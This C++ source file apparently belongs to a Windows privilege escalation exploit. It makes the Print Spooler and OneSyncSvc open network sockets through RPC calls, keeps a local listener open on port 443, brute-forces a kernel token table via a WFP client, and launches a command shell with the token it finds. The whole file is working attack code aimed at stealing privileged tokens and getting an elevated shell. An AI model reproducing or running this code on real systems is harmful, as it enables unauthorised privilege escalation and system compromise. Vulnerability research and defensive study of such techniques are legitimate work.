#include "Triggers.h"

void SearchForTokens(WfpClient* Client)
{
	HANDLE token = Client->BruteForceTable();
	if (token)
	{
		LaunchCMD(token);
		CloseHandle(token);
	}
	else
		wcout << L"No token found" << endl;
}

void TcpListener(const wchar_t* Address, const int Port, WfpClient* Client)
{
	const SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (listenSocket == INVALID_SOCKET) {
		wcout << L"[TcpListener] socket failed with error: " << WSAGetLastError() << endl;
		ExitThread(EXIT_FAILURE);
	}
	//----------------------
	// The sockaddr_in structure specifies the address family,
	// IP address, and port for the socket that is being bound.
	sockaddr_in service;
	service.sin_family = AF_INET;
	service.sin_port = htons(Port);
	InetPtonW(AF_INET, Address, &service.sin_addr);

	if (bind(listenSocket, reinterpret_cast<SOCKADDR*>(&service), sizeof(service)) == SOCKET_ERROR) {
		wcout << L"[TcpListener] bind failed with error: " << WSAGetLastError() << endl;
		closesocket(listenSocket);
		ExitThread(EXIT_FAILURE);
	}
	//----------------------
	// Listen for incoming connection requests.
	// on the created socket
	if (listen(listenSocket, 1) == SOCKET_ERROR) {
		wcout << L"[TcpListener] listen failed with error: " << WSAGetLastError() << endl;
		closesocket(listenSocket);
		ExitThread(EXIT_FAILURE);
	}

	// Signal to the main thread that the RPC call can be made
	HANDLE eventHandle = OpenEvent(EVENT_ALL_ACCESS, false, g_TriggerEvent);
	if (!eventHandle)
	{
		wcout << L"[TcpListener] OpenEvent failed for SocketListeningEvent with error: " << WSAGetLastError() << endl;
		closesocket(listenSocket);
		ExitThread(EXIT_FAILURE);
	}

	SetEvent(eventHandle);
	wcout << L"Waiting for client to connect..." << endl;

	//----------------------
	// Accept the connection.
	const SOCKET acceptSocket = accept(listenSocket, nullptr, nullptr);
	if (acceptSocket == INVALID_SOCKET) {
		wcout << L"[TcpListener] accept failed with error: " << WSAGetLastError() << endl;
		closesocket(listenSocket);
		ExitThread(EXIT_FAILURE);
	}

	wcout << L"Client connected" << endl;

	/*
	 * The token in stored in tcpip!gAleMasterHashTable only while the socket is active.
	 * Once it is closed, the token will be removed
	 * Keeping the socket active while searching for the LUID of the token
	 */
	SearchForTokens(Client);

	// No longer need server socket after the value token is found
	closesocket(acceptSocket);
	closesocket(listenSocket);
	wcout << L"Listener done" << endl;
}

void HttpsListener(WfpClient* Client)
{
	TcpListener(g_RemoteAddress, 443, Client);
}

RPC_BINDING_HANDLE CreateBindingHandle(const wchar_t* Endpoint)
{
	RPC_WSTR stringBinding = nullptr;
	RPC_BINDING_HANDLE bindingHandle = nullptr;
	auto status = RpcStringBindingComposeW(
		nullptr,
		reinterpret_cast<RPC_WSTR>(const_cast<wchar_t*>(L"ncalrpc")),
		nullptr,
		reinterpret_cast<RPC_WSTR>(const_cast<wchar_t*>(Endpoint)),
		nullptr,
		&stringBinding);
	if (status)
		ThrowException("RpcStringBindingComposeW failed", status);

	status = RpcBindingFromStringBindingW(stringBinding, &bindingHandle);
	RpcStringFreeW(&stringBinding);
	if (status)
		ThrowException("RpcBindingFromStringBindingW failed", status);

	return bindingHandle;
}

RPC_BINDING_HANDLE ConnectToRpcServer(const RPC_IF_HANDLE Interface, const wchar_t* Endpoint)
{
	RPC_BINDING_HANDLE bindingHandle = CreateBindingHandle(Endpoint);
	auto status = RpcEpResolveBinding(bindingHandle, Interface);
	if (status)
	{
		RpcBindingFree(&bindingHandle);
		ThrowException("RpcEpResolveBinding failed", status);
	}

	return bindingHandle;
}

// Create an ALPC port to get the object index
ULONG GetAlpcPortObjectIndex()
{
	// Configure standard attributes for the port
	UNICODE_STRING unicodeString;
	ALPC_PORT_ATTRIBUTES    serverPortAttr = {};
	OBJECT_ATTRIBUTES       objectAttributes = {};
	HANDLE portHandle;
	RtlInitUnicodeString(&unicodeString, L"\\RPC Control\\TestPort");
	InitializeObjectAttributes(&objectAttributes, &unicodeString, 0, 0, 0);
	serverPortAttr.MaxMessageLength = 4096;

	// Create the ALPC port
	NTSTATUS status = NtAlpcCreatePort(&portHandle, &objectAttributes, &serverPortAttr);
	if (!NT_SUCCESS(status))
		ThrowException("[GetAlpcPortObjectIndex] NtAlpcCreatePort failed", status);

	const ULONG index = GetObjectIndex(portHandle);

	// Close the port
	NtAlpcDisconnectPort(portHandle, 0);
	CloseHandle(portHandle);
	return index;
}

bool CheckEndpointForInterface(wstring& Endpoint, RPC_SYNTAX_IDENTIFIER* InterfaceId)
{
	// Retrieve the interfaces offered by an RPC server
	bool result = false;
	RPC_IF_HANDLE bindingHandle = CreateBindingHandle(Endpoint.c_str());
	RPC_IF_ID_VECTOR* interfacesVector = nullptr;
	RPC_STATUS status = RpcMgmtInqIfIds(bindingHandle, &interfacesVector);

	if (status != RPC_S_OK)
		return false;

	// Iterate the interfaces and check if the parameter InterfaceId is one of them
	for (int i = 0; i < interfacesVector->Count; i++)
	{
		RPC_IF_ID* currentInterfaceId = interfacesVector->IfId[i];
		if (currentInterfaceId->VersMajor == InterfaceId->SyntaxVersion.MajorVersion &&
			currentInterfaceId->VersMinor == InterfaceId->SyntaxVersion.MinorVersion &&
			!UuidCompare(&currentInterfaceId->Uuid, &InterfaceId->SyntaxGUID, &status))
		{
			result = true;
			break;
		}
	}
	RpcIfIdVectorFree(&interfacesVector);
	return result;
}

wstring GetEndpointFromHandleTable(const DWORD Pid)
{
	wstring endpoint;
	const DWORD alpcPortIndex = GetAlpcPortObjectIndex();
	vector<HANDLE> handlesVector = GetHandlesFromProcess(Pid, alpcPortIndex, nullptr);

	// Open a handle to the process with the minimum access required
	const HANDLE processHandle = OpenProcess(PROCESS_DUP_HANDLE, false, Pid);
	if (nullptr == processHandle)
		ThrowException("[GetEndpointFromHandleTable] OpenProcess failed", GetLastError());

	// Iterate over each handle in the vector
	for (const auto& handle : handlesVector)
	{
		// The handle needs to be duplicated into the current process to be queried
		HANDLE duplicatedHandle;
		if (!DuplicateHandle(processHandle, handle, GetCurrentProcess(), &duplicatedHandle, 0, FALSE, DUPLICATE_SAME_ACCESS))
		{
			wcout << "[FindRpcEndpoint] DuplicateHandle failed" << endl;
			continue;
		}

		wstring objectPath = GetPathFromHandle(duplicatedHandle);
		CloseHandle(duplicatedHandle);

		// Check the ALPC Port starts with "\RPC Control\LRPC" and not "\RPC Control\OLE"
		if (objectPath.find(L"\\RPC Control\\LRPC") == 0)
		{
			// Processes can have serveral ALPC Ports. Make sure the port offers the SyncController interface
			if (CheckEndpointForInterface(objectPath, &static_cast<RPC_CLIENT_INTERFACE*>(SyncController_v1_0_c_ifspec)->InterfaceId))
			{
				CloseHandle(processHandle);
				return objectPath;
			}

		}
	}
	CloseHandle(processHandle);
	ThrowException("[FindRpcEndpoint] no endpoint found", STATUS_NOT_FOUND);
}

DWORD TriggerPrintSpooler(WfpClient* Client)
{
	// Initiate the parameters for the RPC call
	wcout << L"Triggering Spooler service to create socket" << endl;
	wstring printerName = L"\\\\";
	printerName.append(g_RemoteAddress);
	PRINTER_HANDLE printerHandle = nullptr;
	DEVMODE_CONTAINER devmodeContainer = {};
	DWORD status = 0;

	try
	{
		wcout << L"Calling RpcOpenPrinter. Printer name: " << printerName << endl;
		// spooler.exe will connect to a socket opened by RpcSs
		status = RpcOpenPrinter(printerName.data(), &printerHandle, nullptr, &devmodeContainer, 0);
	}
	catch (std::exception& ex)
	{
		wcout << L"[TriggerPrintSpooler] RpcOpenPrinter failed. " << ex.what() << endl;
	}

	// After the connection is made, new token will be added to tcpip!gAleMasterHashTable
	SearchForTokens(Client);
	return status;
}

DWORD TriggerAccountsMgmt(WfpClient* Client, wstring& Endpoint)
{
	// Initiate the parameters for the RPC call
	wcout << L"Triggering OneSyncSvc to create socket" << endl;
	wstring server = L"ronb@";
	server.append(g_RemoteAddress);
	wcout << L"Calling AccountsMgmtRpcDiscoverExchangeServerAuthType" << endl << "Server address: " << server << endl;
	int out = 0;

	// No service listens to 127.0.0.1:443 by default. Create a listener so a socket can be created
	HANDLE eventHandle = CreateEventW(nullptr, true, false, g_TriggerEvent);
	if (!eventHandle)
		ThrowException("[TriggerAccountsMgmt] CreateEventW failed", GetLastError());

	HANDLE threadHandle = CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(HttpsListener), Client, 0, nullptr);
	if (!threadHandle)
	{
		CloseHandle(eventHandle);
		ThrowException("[TriggerAccountsMgmt] CreateThread failed", GetLastError());
	}

	// Wait for the thread to start listening
	HANDLE handlesArray[2] = {threadHandle , eventHandle};
	DWORD waitResult = WaitForMultipleObjects(2, handlesArray, false, INFINITE);
	DWORD handleIndex = waitResult - WAIT_OBJECT_0;
	CloseHandle(eventHandle);

	// If the object that was signaled is the thread handle, there was an error
	if (0 == handleIndex)
	{
		CloseHandle(threadHandle);
		ThrowException("[TriggerAccountsMgmt] Listener thread failed", GetLastError());
	}

	// After the event was signaled, the RPC call can be made
	RPC_BINDING_HANDLE bindingHandle = ConnectToRpcServer(SyncController_v1_0_c_ifspec, Endpoint.c_str());
	DWORD status = AccountsMgmtRpcDiscoverExchangeServerAuthType(bindingHandle, server.data(), &out);
	RpcBindingFree(&bindingHandle);

	// After the listener closes the socket, the thread will exit
	DWORD waitStatus = WaitForSingleObject(threadHandle, THREAD_WAIT_TIME);
	CloseHandle(threadHandle);
	if (WAIT_TIMEOUT == waitStatus)
		ThrowException("[TriggerAccountsMgmt] Listener thread didn't receive connection", GetLastError());
	return status;
}

handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
{
	RPC_BINDING_HANDLE bindingHandle = nullptr;
	try
	{
		bindingHandle = ConnectToRpcServer(winspool_v1_0_c_ifspec, nullptr);
	}
	catch (std::exception& ex)
	{
		wcout << ex.what() << endl;
	}
	return bindingHandle;
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle)
{
	RpcBindingFree(&BindingHandle);
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}